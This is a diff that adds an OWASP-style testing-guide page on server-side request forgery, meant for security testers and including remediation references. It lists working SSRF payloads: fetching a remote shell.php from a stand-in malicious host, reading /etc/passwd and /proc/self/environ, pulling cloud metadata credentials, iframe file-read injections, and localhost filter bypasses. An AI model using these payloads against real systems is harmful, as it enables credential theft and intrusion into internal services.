@@ -1,0 +1,192 @@
+---
+layout: document
+title: WSTG - Latest
+collection_name: latest
+channel_label: Latest
+channel_path: latest
+render_with_liquid: false
+---
+
+# Server-Side Request Forgery
+
+|ID          |
+|------------|
+|WSTG-INJT-18|
+
+## Summary
+
+Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).
+
+## Test Objectives
+
+- Identify SSRF injection points.
+- Test if the injection points are exploitable.
+- Asses the severity of the vulnerability.
+
+## How to Test
+
+When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.
+
+Consider the following request:
+
+``` http
+GET https://example.com/page?page=about.php
+```
+
+You can test this request with the following payloads.
+
+### Load the Contents of a File
+
+```http
+GET https://example.com/page?page=https://malicioussite.com/shell.php
+```
+
+### Access a Restricted Page
+
+```http
+GET https://example.com/page?page=http://localhost/admin
+```
+
+Or:
+
+```http
+GET https://example.com/page?page=http://127.0.0.1/admin
+```
+
+Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.
+
+These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.
+
+### Fetch a Local File
+
+```http
+GET https://example.com/page?page=file:///etc/passwd
+```
+
+If the parameter is used as a file path rather than a URL, see [File Inclusion](../10.1-File_Inclusion/) and [Directory Traversal and File Include](../../09-Authorization/01-Directory_Traversal_File_Include/).
+
+### HTTP Methods Used
+
+All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
+
+One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.
+
+You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).
+
+### PDF Generators
+
+In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.
+
+```html
+<iframe src="file:///etc/passwd" width="400" height="400">
+<iframe src="file:///c:/windows/win.ini" width="400" height="400">
+```
+
+### API Entry Points
+
+APIs commonly accept URLs in JSON or XML bodies rather than query strings, for example webhook and callback registration, import-by-URL, avatar or logo fetch, link preview, and identity provider settings. Review the API specification and responses for fields named `url`, `uri`, `callback`, `webhook`, `endpoint`, `redirect`, `host`, `feed`, or `source`, including nested ones.
+
+```http
+POST /api/v1/webhooks HTTP/1.1
+Content-Type: application/json
+
+{"url": "http://127.0.0.1:8080/admin", "events": ["order.created"]}
+```
+
+Test each such field with the payloads above and the [bypasses below](#common-filter-bypass). Also consider:
+
+- Different validation on create and update: register an allowed external URL, then change it to an internal one with an update (`PUT` or `PATCH`) request. Alternatively, register a URL you control that later redirects to an internal address, which tests whether validation happens only once.
+- Delayed fetches: webhook deliveries, report generation, and imports are often processed asynchronously and are blind. Trigger the event, then use the techniques in [Blind SSRF Detection](#blind-ssrf-detection).
+- Other fetching features: link previews and PDF or screenshot generation (see [PDF Generators](#pdf-generators)), and URL-based file import.
+- Request methods: webhook deliveries are usually `POST`, which many internal services (including cloud metadata) do not answer, so confirm with a destination you control before concluding the target is unreachable.
+
+For GraphQL, aliasing or batching the same URL-accepting mutation or query can probe many internal hosts or ports in a single request. See [GraphQL](../../16-API_Testing/99-GraphQL/#batching-attacks).
+
+### Cloud and Container Metadata
+
+If a request can be made to an internal address with a `GET`, try the metadata services of the hosting platform. Obtaining credentials from them is a common way to escalate an SSRF.
+
+```http
+# AWS (IMDSv1)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP (requires the header Metadata-Flavor: Google)
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure (requires the header Metadata: true)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+- AWS IMDSv2 requires a `PUT` request to obtain a token and a custom header on every request. If the vulnerable feature cannot control the method and headers, IMDSv2 blocks credential theft through that vector, but the SSRF itself remains, so continue testing other internal targets.
+- GCP and Azure require custom headers. Header injection into the outbound request may allow them to be satisfied.
+- AWS ECS and Fargate expose task credentials at `http://169.254.170.2/v2/credentials/<GUID>`. The GUID is only available in the container's `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable, so obtain it first, for example by reading `file:///proc/self/environ` as described in [Fetch a Local File](#fetch-a-local-file).
+- EKS Pod Identity serves credentials at `http://169.254.170.23`. IRSA uses a projected token file (`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`) and has no network endpoint, so it is only reachable through a file read.
+- Other internal services may be reachable, for example the Kubernetes API (`https://kubernetes.default.svc/`, which normally returns `401` or `403` without a token, but still shows the API server is reachable), Consul (`http://consul:8500/v1/catalog/services`), and the Docker Engine API if exposed on TCP (`http://host:2375/containers/json`).
+
+### Blind SSRF Detection
+
+When the response does not show the fetched content, use an out-of-band (OAST) service such as Burp Collaborator or interactsh. Submit a unique URL under your control and watch for HTTP and DNS interactions:
+
+```json
+{"url": "http://<OAST_DOMAIN>/ssrf-test-1"}
+```
+
+- A DNS-only interaction indicates the server resolves the host but egress filtering may block the connection. Try different ports and schemes.
+- Callbacks may arrive minutes or hours later for asynchronous features, so keep monitoring and use a unique identifier per injection point.
+- Differences in response time or error messages for open and closed internal ports can also indicate SSRF when no out-of-band interaction is possible.
+
+### Identity Provider Integrations
+
+Features that accept an OpenID Connect issuer or a SAML metadata URL cause the server to fetch the document. Clients append `/.well-known/openid-configuration` to the issuer themselves, so supply only the issuer:
+
+```json
+{"issuer": "http://127.0.0.1:8080"}
+```
+
+A more realistic case is an issuer you control whose discovery document sets `jwks_uri` or `token_endpoint` to an internal address.
+
+### Common Filter Bypass
+
+Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:
+
+- Using alternative IP representation that evaluate to `127.0.0.1`:
+    - Decimal notation: `2130706433`
+    - Octal notation: `017700000001`
+    - IP shortening: `127.1`
+    - Alternative IPs treated as loopback: `127.0.0.2`
+- String obfuscation
+- Creating a public DNS on a domain you own that resolves to `127.0.0.1`
+
+Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).
+
+- Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
+- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
+- URL encoding
+- Fuzzing
+- Combinations of all of the above
+
+For additional payloads and bypass techniques, see the [references](#references) section.
+
+## Related Test Cases
+
+- [Directory Traversal and File Include](../../09-Authorization/01-Directory_Traversal_File_Include/)
+- [File Inclusion](../10.1-File_Inclusion/)
+- [Inbound Webhooks](../../16-API_Testing/09-Inbound_Webhooks/)
+- [GraphQL](../../16-API_Testing/99-GraphQL/)
+
+## Remediation
+
+SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+
+## References
+
+- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
+- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
+- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
+- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
+- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/levelup/server-side-forgery-request/)
+- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
+- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
+- [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)
